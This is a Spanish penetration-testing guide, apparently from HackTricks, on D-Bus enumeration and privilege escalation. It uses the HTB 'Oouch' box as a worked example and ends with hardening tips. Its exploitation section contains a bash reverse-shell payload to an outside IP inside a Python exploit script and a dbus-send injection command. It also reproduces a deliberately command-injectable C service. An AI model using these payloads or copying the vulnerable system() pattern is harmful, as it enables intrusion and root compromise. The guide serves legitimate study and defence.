# Enumeración de D-Bus y escalada de privilegios mediante inyección de comandos

{{#include ../../banners/hacktricks-training.md}}

## **Enumeración mediante GUI**

D-Bus se utiliza como mediador de comunicación entre procesos (IPC) en los entornos de escritorio Ubuntu. En Ubuntu, se observa el funcionamiento simultáneo de varios buses de mensajes: el bus del sistema, utilizado principalmente por **servicios privilegiados para exponer servicios relevantes para todo el sistema**, y un bus de sesión para cada usuario que haya iniciado sesión, que expone servicios relevantes solo para ese usuario. Aquí nos centramos principalmente en el bus del sistema por su asociación con servicios que se ejecutan con privilegios más elevados (p. ej., root), ya que nuestro objetivo es escalar privilegios. Cabe señalar que la arquitectura de D-Bus emplea un «enrutador» por cada bus de sesión, que se encarga de redirigir los mensajes de los clientes a los servicios adecuados en función de la dirección especificada por los clientes para el servicio con el que desean comunicarse.<sup>[[1]](#references)</sup>

Los servicios de D-Bus se definen mediante los **objetos** y las **interfaces** que exponen. Los objetos pueden compararse con las instancias de clase de los lenguajes OOP habituales, y cada instancia se identifica de forma única mediante una **ruta de objeto**. Esta ruta, similar a una ruta del sistema de archivos, identifica de forma única cada objeto expuesto por el servicio. Una interfaz clave para la investigación es **org.freedesktop.DBus.Introspectable**, que incluye un único método, Introspect. Este método devuelve una representación XML de los métodos, señales y propiedades compatibles con el objeto; aquí nos centramos en los métodos y omitimos las propiedades y las señales.

Para comunicarnos con la interfaz de D-Bus, se utilizaron dos herramientas: una herramienta CLI llamada **gdbus**, que permite invocar fácilmente en scripts los métodos expuestos por D-Bus, y [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), una herramienta GUI basada en Python diseñada para enumerar los servicios disponibles en cada bus y mostrar los objetos contenidos en cada servicio.

```bash
sudo apt-get install d-feet
```

Si estás comprobando el **bus de sesión**, confirma primero la dirección actual:

```bash
echo "$DBUS_SESSION_BUS_ADDRESS"
```

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

En la primera imagen se muestran los servicios registrados en el bus del sistema D-Bus; **org.debin.apt** aparece resaltado tras seleccionar el botón System Bus. D-Feet consulta este servicio para obtener objetos y muestra las interfaces, los métodos, las propiedades y las señales de los objetos seleccionados, como se ve en la segunda imagen. También se detalla la firma de cada método.

Una característica destacable es que se muestran el **ID de proceso (pid)** y la **línea de comandos** del servicio, lo que resulta útil para confirmar si se ejecuta con privilegios elevados, algo importante para determinar la relevancia de la investigación.

**D-Feet también permite invocar métodos**: los usuarios pueden introducir expresiones Python como parámetros, que D-Feet convierte a tipos D-Bus antes de pasarlas al servicio.

Sin embargo, ten en cuenta que **algunos métodos requieren autenticación** antes de permitir su invocación. Ignoraremos estos métodos, ya que nuestro objetivo es elevar nuestros privilegios sin credenciales.

Ten en cuenta también que algunos servicios consultan a otro servicio D-Bus llamado org.freedeskto.PolicyKit1 para determinar si se debería permitir o no que un usuario realice ciertas acciones.

## **Enumeración de la línea de comandos**

### Listar objetos del servicio

Es posible listar las interfaces D-Bus abiertas con:

```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```

Los servicios marcados como **`(activatable)`** son especialmente interesantes porque **aún no están en ejecución**, pero una solicitud al bus puede iniciarlos bajo demanda. No te limites a `busctl list`; relaciona esos nombres con los binarios que ejecutarían.

```bash
ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
```

Eso te indica rápidamente qué ruta `Exec=` se iniciará para un nombre activable y con qué identidad. Si el binario o su cadena de ejecución están protegidos de forma deficiente, un servicio inactivo aún puede convertirse en una vía para la escalada de privilegios.

Para un servicio privilegiado de creación de imágenes USB, correlaciona su nombre en el bus del sistema con la política **efectiva** para su acción de escritura de imágenes. Una regla heredada del proveedor puede conceder a un grupo Unix administrativo `ResultActive=yes` sin solicitar contraseña; confirma que la cuenta actual pertenece a ese grupo, que la sesión está activa, que la regla está realmente cargada y no ha sido reemplazada, y que el helper instalado todavía acepta rutas de origen y destino elegidas por quien lo llama. El descriptor del servicio o una versión antigua del paquete no prueban por sí solos que se pueda acceder a archivos arbitrarios. La ausencia de un descriptor de activación tampoco descarta que haya un servicio en ejecución. Inspecciona los archivos fijos de políticas y servicios sin invocar el método de escritura de imágenes; consulta el [análisis original del servicio](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/).

#### Conexiones

[De Wikipedia:](https://en.wikipedia.org/wiki/D-Bus) Cuando un proceso establece una conexión con un bus, este asigna a la conexión un nombre especial de bus llamado _nombre de conexión único_. Los nombres de bus de este tipo son inmutables: se garantiza que no cambiarán mientras exista la conexión y, lo que es más importante, no se pueden reutilizar durante la vida útil del bus. Esto significa que ninguna otra conexión a ese bus tendrá asignado nunca ese nombre de conexión único, aunque el mismo proceso cierre la conexión al bus y cree una nueva. Los nombres de conexión únicos son fáciles de reconocer porque empiezan con el carácter de dos puntos, que de otro modo está prohibido.<sup>[[4]](#references)</sup>

### Información del objeto de servicio

A continuación, puedes obtener información sobre la interfaz con:

```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
        cap_fowner cap_fsetid cap_kill cap_setgid
        cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
        cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
        cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
        cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
        cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
        cap_mknod cap_lease cap_audit_write cap_audit_control
        cap_setfcap cap_mac_override cap_mac_admin cap_syslog
        cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
        cap_fowner cap_fsetid cap_kill cap_setgid
        cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
        cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
        cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
        cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
        cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
        cap_mknod cap_lease cap_audit_write cap_audit_control
        cap_setfcap cap_mac_override cap_mac_admin cap_syslog
        cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
        cap_fowner cap_fsetid cap_kill cap_setgid
        cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
        cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
        cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
        cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
        cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
        cap_mknod cap_lease cap_audit_write cap_audit_control
        cap_setfcap cap_mac_override cap_mac_admin cap_syslog
        cap_wake_alarm cap_block_suspend cap_audit_read
```

También correlaciona el nombre del bus con su unidad de `systemd` y la ruta del ejecutable:

```bash
systemctl status dbus-server.service --no-pager
systemctl cat dbus-server.service
namei -l /root/dbus-server
```

Esto responde a la pregunta operativa importante durante el privesc: **si una llamada a un método tiene éxito, ¿qué binario y unidad reales realizarán la acción?**

### Enumerar las interfaces de un objeto de servicio

Necesitas tener suficientes permisos.

```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
  └─/htb/oouch
    └─/htb/oouch/Block
```

### Inspeccionar la interfaz de un objeto de servicio

Observa que en este ejemplo se seleccionó la última interfaz descubierta usando el parámetro `tree` (_consulta la sección anterior_):

```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```

Observa el método `.Block` de la interfaz `htb.oouch.Block` (el que nos interesa). La «s» de las otras columnas podría indicar que espera una cadena.

Antes de intentar algo peligroso, valida primero un método **orientado a la lectura** o de bajo riesgo. Así se distinguen claramente tres casos: sintaxis incorrecta, método accesible pero denegado, o método accesible y permitido.

```bash
busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
```

### Correlacionar métodos de D-Bus con políticas y acciones

La introspección te dice **qué** puedes invocar, pero no te dice **por qué** se permite o se deniega una llamada. Para un análisis real de privesc, normalmente necesitas inspeccionar **tres capas a la vez**:

1. **Metadatos de activación** (archivos `.service` o `SystemdService=`) para averiguar qué binario y unidad se ejecutarán realmente.
2. **Política XML de D-Bus** (`/etc/dbus-1/system.d/`, `/usr/share/dbus-1/system.d/`) para averiguar quién puede `own`, `send_destination` o `receive_sender`.
3. **Archivos de acciones de Polkit** (`/usr/share/polkit-1/actions/*.policy`) para averiguar el modelo de autorización predeterminado (`allow_active`, `allow_inactive`, `auth_admin`, `auth_self`, `org.freedesktop.policykit.imply`).

Comandos útiles:

```bash
grep -RInE '^(Name|Exec|SystemdService|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=|user=|group=' /etc/dbus-1/system.d /usr/share/dbus-1/system.d /etc/dbus-1/system-local.d 2>/dev/null
grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.policykit\.imply' /usr/share/polkit-1/actions 2>/dev/null
pkaction --verbose
```

**No** asumas una correspondencia 1:1 entre un método de D-Bus y una acción de Polkit. El mismo método puede elegir una acción diferente según el objeto que se modifica o el contexto de ejecución. Por lo tanto, el flujo de trabajo práctico es:

1. `busctl introspect` / `gdbus introspect`
2. `pkaction --verbose` y busca en los archivos `.policy` relevantes
3. Sondeos en vivo de bajo riesgo con `busctl call`, `gdbus call` o `dbusmap --enable-probes --null-agent`

Los servicios proxy o de compatibilidad merecen especial atención. Un **proxy que se ejecuta como root** y reenvía solicitudes a otro servicio D-Bus mediante su propia conexión preestablecida puede hacer que el backend trate accidentalmente todas las solicitudes como si provinieran del UID 0, a menos que se vuelva a validar la identidad del cliente original.<sup>[[3]](#references)</sup>

### Interfaz de monitorización/captura

Con privilegios suficientes (los privilegios `send_destination` y `receive_sender` por sí solos no bastan), puedes **monitorizar una comunicación de D-Bus**.

Para **monitorizar** una **comunicación**, necesitarás ser **root**. Si sigues teniendo problemas como root, consulta [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) y [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

> [!WARNING]
> Si sabes cómo configurar un archivo de configuración de D-Bus para **permitir que usuarios que no sean root espíen** la comunicación, ¡**ponte en contacto conmigo**!

Diferentes formas de monitorizar:

```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```

En el siguiente ejemplo, se monitorea la interfaz `htb.oouch.Block` y **el mensaje "**_**lalalalal**_**" se envía mediante un error de comunicación**:

```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
  Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
  UniqueName=:1.1376
  MESSAGE "s" {
          STRING "lalalalal";
  };

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
  Sender=:1.3  Destination=:1.1376
  UniqueName=:1.3
  MESSAGE "s" {
          STRING "Carried out :D";
  };
```

Puedes usar `capture` en lugar de `monitor` para guardar los resultados en un archivo **pcapng** que Wireshark pueda abrir:

```bash
sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng
sudo busctl capture > system-bus.pcapng
```

#### Filtrar todo el ruido <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

Si hay demasiada información en el bus, pasa una regla de coincidencia como esta:

```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```

Se pueden especificar varias reglas. Si un mensaje coincide con _cualquiera_ de las reglas, se imprimirá. Así:

```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```

Consulta la [documentación de D-Bus](http://dbus.freedesktop.org/doc/dbus-specification.html) para obtener más información sobre la sintaxis de las reglas de coincidencia.<sup>[[7]](#references)</sup>

### Más

`busctl` tiene aún más opciones; [**encuéntralas todas aquí**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Escenario vulnerable**

Como usuario **qtc dentro del host "oouch" de HTB**, puedes encontrar un **archivo de configuración de D-Bus inesperado** ubicado en _/etc/dbus-1/system.d/htb.oouch.Block.conf_:

```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
 "-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
 "http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

    <policy user="root">
        <allow own="htb.oouch.Block"/>
    </policy>

	<policy user="www-data">
		<allow send_destination="htb.oouch.Block"/>
		<allow receive_sender="htb.oouch.Block"/>
	</policy>

</busconfig>
```

Nota de la configuración anterior: **deberás ser el usuario `root` o `www-data` para enviar y recibir información** mediante esta comunicación D-BUS.

Como usuario **qtc**, dentro del contenedor de docker **aeb4525789d8**, puedes encontrar código relacionado con dbus en el archivo _/code/oouch/routes.py._ Este es el código interesante:

```python
if primitive_xss.search(form.textfield.data):
        bus = dbus.SystemBus()
        block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
        block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

        client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
        response = block_iface.Block(client_ip)
        bus.close()
        return render_template('hacker.html', title='Hacker')
```

Como puedes ver, se está **conectando a una interfaz D-Bus** y enviando `client_ip` a la función **"Block"**.

Al otro lado de la conexión D-Bus se está ejecutando un binario compilado en C. Este código está **escuchando** en la conexión D-Bus **una dirección IP y llama a iptables mediante la función `system`** para bloquear la dirección IP indicada.\
**La llamada a `system` es vulnerable intencionadamente a command injection**, por lo que un payload como el siguiente creará una reverse shell: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Explotarlo

Al final de esta página puedes encontrar el **código C completo de la aplicación D-Bus**. Dentro encontrarás, entre las líneas 91-97, **cómo se registran la `ruta del objeto D-Bus`** y el **`nombre de la interfaz`**. Esta información será necesaria para enviar información a la conexión D-Bus:

```c
        /* Install the object */
        r = sd_bus_add_object_vtable(bus,
                                     &slot,
                                     "/htb/oouch/Block",  /* interface */
                                     "htb.oouch.Block",   /* service object */
                                     block_vtable,
                                     NULL);
```

Además, en la línea 57 puedes ver que **el único método registrado** para esta comunicación D-Bus se llama `Block`(_**Por eso, en la siguiente sección, los payloads se enviarán al objeto de servicio `htb.oouch.Block`, la interfaz `/htb/oouch/Block` y el nombre del método `Block`**_):

```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```

#### Python

El siguiente código de Python enviará el payload a la conexión D-Bus mediante el método `Block`, usando `block_iface.Block(runme)` (_ten en cuenta que se extrajo del fragmento de código anterior_):

```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```

#### busctl y dbus-send

```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```

- `dbus-send` es una herramienta que se utiliza para enviar mensajes al «Bus de mensajes».
- Bus de mensajes: software que los sistemas utilizan para facilitar la comunicación entre aplicaciones. Está relacionado con Message Queue (los mensajes se ordenan en secuencia), pero en el Bus de mensajes se envían mediante un modelo de suscripción y también muy rápidamente.
- La etiqueta “-system” se utiliza para indicar que es un mensaje del sistema, no de una sesión (que es el valor predeterminado).
- La etiqueta “–print-reply” se utiliza para imprimir nuestro mensaje correctamente y recibir cualquier respuesta en un formato legible para las personas.
- “–dest=Dbus-Interface-Block”: la dirección de la interfaz D-Bus.
- “–string:” es el tipo de mensaje que queremos enviar a la interfaz. Hay varios formatos para enviar mensajes, como double, bytes, booleans, int y objpath. De estos, la «ruta de objeto» resulta útil cuando queremos enviar la ruta de un archivo a la interfaz D-Bus. En este caso, podemos usar un archivo especial (FIFO) para pasar un comando a la interfaz con el nombre de un archivo. “string:;” sirve para volver a llamar a la ruta de objeto donde ubicamos el archivo/comando de reverse shell FIFO.

_Ten en cuenta que, en `htb.oouch.Block.Block`, la primera parte (`htb.oouch.Block`) hace referencia al objeto de servicio y la última parte (`.Block`) hace referencia al nombre del método._

### Código C

```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
        char* host = NULL;
        int r;

        /* Read the parameters */
        r = sd_bus_message_read(m, "s", &host);
        if (r < 0) {
                fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
                return r;
        }

        char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

        int command_len = strlen(command);
        int host_len = strlen(host);

        char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
        if(command_buffer == NULL) {
                fprintf(stderr, "Failed to allocate memory\n");
                return -1;
        }

        sprintf(command_buffer, command, host);

        /* In the first implementation, we simply ran command using system(), since the expected DBus
         * to be threading automatically. However, DBus does not thread and the application will hang
         * forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
         * multithreading)
         */
        int pid = fork();

        if ( pid == 0 ) {
            /* Here we are in the child process. We execute the command and eventually exit. */
            system(command_buffer);
            exit(0);
        } else {
            /* Here we are in the parent process or an error occured. We simply send a genric message.
             * In the first implementation we returned separate error messages for success or failure.
             * However, now we cannot wait for results of the system call. Therefore we simply return
             * a generic. */
            return sd_bus_reply_method_return(m, "s", "Carried out :D");
        }
        r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
        SD_BUS_VTABLE_START(0),
        SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
        SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
        /*
         * Main method, registeres the htb.oouch.Block service on the system dbus.
         *
         * Paramaters:
         *      argc            (int)             Number of arguments, not required
         *      argv[]          (char**)          Argument array, not required
         *
         * Returns:
         *      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
         *      as long as the user keeps it alive.
         */


        /* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
        signal(SIGCHLD,SIG_IGN);

        sd_bus_slot *slot = NULL;
        sd_bus *bus = NULL;
        int r;

        /* First we need to connect to the system bus. */
        r = sd_bus_open_system(&bus);
        if (r < 0)
        {
                fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
                goto finish;
        }

        /* Install the object */
        r = sd_bus_add_object_vtable(bus,
                                     &slot,
                                     "/htb/oouch/Block",  /* interface */
                                     "htb.oouch.Block",   /* service object */
                                     block_vtable,
                                     NULL);
        if (r < 0) {
                fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
                goto finish;
        }

        /* Register the service name to find out object */
        r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
        if (r < 0) {
                fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
                goto finish;
        }

        /* Infinite loop to process the client requests */
        for (;;) {
                /* Process requests */
                r = sd_bus_process(bus, NULL);
                if (r < 0) {
                        fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
                        goto finish;
                }
                if (r > 0) /* we processed a request, try to process another one, right-away */
                        continue;

                /* Wait for the next request to process */
                r = sd_bus_wait(bus, (uint64_t) -1);
                if (r < 0) {
                        fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
                        goto finish;
                }
        }

finish:
        sd_bus_slot_unref(slot);
        sd_bus_unref(bus);

        return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```

## Helpers de enumeración automatizada (2023-2025)

Enumerar manualmente una gran superficie de ataque de D-Bus con `busctl`/`gdbus` se vuelve tedioso rápidamente. Dos pequeñas utilidades FOSS publicadas en los últimos años pueden agilizar las cosas durante operaciones de red-team o CTF:

### dbusmap ("Nmap for D-Bus")
* Autor: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)<sup>[[5]](#references)</sup>
* Escrito en C; binario estático único (<50 kB) que recorre todas las rutas de objetos, obtiene el XML de `Introspect` y lo relaciona con el PID/UID propietario.<sup>[[5]](#references)</sup>
* Indicadores útiles:
  ```bash
  # List every service on the *system* bus and dump all callable methods
  sudo dbus-map --dump-methods

  # Actively probe methods/properties you can reach without Polkit prompts
  sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
  ```
* La herramienta marca los nombres well-known sin protección con `!`, lo que revela al instante los servicios que puedes *own* (tomar control) o las llamadas a métodos accesibles desde un shell sin privilegios.

### uptux.py
* Autor: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)<sup>[[6]](#references)</sup>
* Script solo de Python que busca rutas *escribibles* en unidades de systemd **y** archivos de políticas de D-Bus con permisos demasiado amplios (p. ej., `send_destination="*"`).<sup>[[6]](#references)</sup>
* Uso rápido:
  ```bash
  python3 uptux.py -n          # run all checks but don’t write a log file
  python3 uptux.py -d          # enable verbose debug output
  ```
* El módulo D-Bus busca en los directorios siguientes y destaca cualquier servicio que un usuario normal pueda suplantar o secuestrar:
  * `/etc/dbus-1/system.d/` y `/usr/share/dbus-1/system.d/`
  * `/etc/dbus-1/system-local.d/` (anulaciones del proveedor)

---

## Errores notables de escalada de privilegios en D-Bus (2024-2025)

Estar al tanto de los CVE publicados recientemente ayuda a detectar patrones inseguros similares en código personalizado. Dos buenos ejemplos recientes son:<sup>[[2]](#references)[[3]](#references)</sup>

| Año | CVE | Componente | Causa raíz | Lección ofensiva |
|------|-----|-----------|------------|------------------|
| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (`logid`) | El servicio que se ejecutaba como root exponía una interfaz D-Bus que los usuarios sin privilegios podían reconfigurar, incluso cargando comportamientos de macros controlados por un atacante. | Si un daemon expone **administración de dispositivos/perfiles/configuración** en el bus del sistema, trata la configuración modificable y las funciones de macros como primitivas de ejecución de código, no como simples «ajustes». |
| 2025 | CVE-2025-23222 | `dde-api-proxy` de Deepin ≤ 1.0.19 | Un proxy de compatibilidad que se ejecutaba como root reenviaba solicitudes a servicios backend sin preservar el contexto de seguridad del caller original, por lo que los backends confiaban en el proxy como UID 0. | Trata los servicios D-Bus de **proxy / puente / compatibilidad** como una clase de errores aparte: si retransmiten llamadas privilegiadas, comprueba cómo llega al backend el contexto del UID del caller y de Polkit. |

Patrones a tener en cuenta:
1. El servicio se ejecuta **como root en el bus del sistema**.
2. No hay **ninguna comprobación de autorización** o esta se realiza sobre el **sujeto equivocado**.
3. El método accesible acaba modificando el estado del sistema: instalación de paquetes, cambios de usuarios/grupos, configuración del bootloader, actualizaciones de perfiles de dispositivos, escritura de archivos o ejecución directa de comandos.

Usa `dbusmap --enable-probes` o una llamada manual con `busctl call` para confirmar si se puede acceder a un método; después, inspecciona la política XML del servicio y las acciones de Polkit para entender **a qué sujeto** se está autorizando realmente.

---

## Endurecimiento y detección: medidas rápidas

* Busca políticas con permisos de escritura para todos o con *send/receive* abiertos:
  ```bash
  grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
  ```
* Exige Polkit para los métodos peligrosos: incluso los proxies root deberían pasar el PID del llamador a `polkit_authority_check_authorization_sync()` en lugar del suyo.
* Reduce los privilegios de los helpers de larga duración (usa `sd_pid_get_owner_uid()` para cambiar de namespace después de conectarte al bus).
* Si no puedes eliminar un servicio, al menos delimítalo a un grupo Unix dedicado y restringe el acceso en su política XML.
* Blue-team: captura el system bus con `busctl capture > /var/log/dbus_$(date +%F).pcapng` e impórtalo en Wireshark para detectar anomalías.

---

## References

- [1] [Escalada de privilegios de USBCreator D-Bus en Ubuntu Desktop](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
- [2] [CVE-2024-45752: el servicio D-Bus permite que cualquier usuario sin privilegios cambie la configuración](https://github.com/PixlOne/logiops/issues/473)
- [3] [dde-api-proxy: omisión de autenticación en el servicio proxy D-Bus de Deepin (CVE-2025-23222)](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
- [4] [D-Bus - Wikipedia](https://en.wikipedia.org/wiki/D-Bus)
- [5] [taviso/dbusmap - «Nmap para D-Bus»](https://github.com/taviso/dbusmap)
- [6] [initstring/uptux](https://github.com/initstring/uptux)
- [7] [dbus.freedesktop.org - documentación de D-Bus](http://dbus.freedesktop.org/doc/dbus-specification.html)
{{#include ../../banners/hacktricks-training.md}}
